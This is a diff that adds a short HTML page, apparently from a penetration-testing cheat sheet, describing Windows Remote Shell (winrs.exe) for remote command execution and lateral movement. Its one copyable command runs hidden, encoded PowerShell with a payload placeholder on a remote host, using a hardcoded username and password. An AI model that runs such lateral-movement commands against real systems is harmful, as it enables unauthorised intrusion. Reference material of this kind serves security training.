@@ -1,0 +1,20 @@
+<section class="page active prose-page">
+  <h1>winrs.exe</h1>
+
+  <p class="intro">
+    WinRS (Windows Remote Shell) is a built-in Windows command-line utility that uses Windows Remote Management (WinRM)
+    to execute commands on remote systems. It enables authenticated users to run commands or applications without
+    establishing an interactive desktop session and is commonly used for remote administration and lateral movement.
+  </p>
+
+  <div class="section-title">
+    <span></span>
+    <h2>Execute Command On The Target</h2>
+    <span></span>
+  </div>
+
+  <div class="command-row">
+    <code class="copy-text">winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e &lt;base64 payload&gt;"</code>
+    <button class="copy-button" type="button" aria-label="Copy command">Copy</button>
+  </div>
+</section>
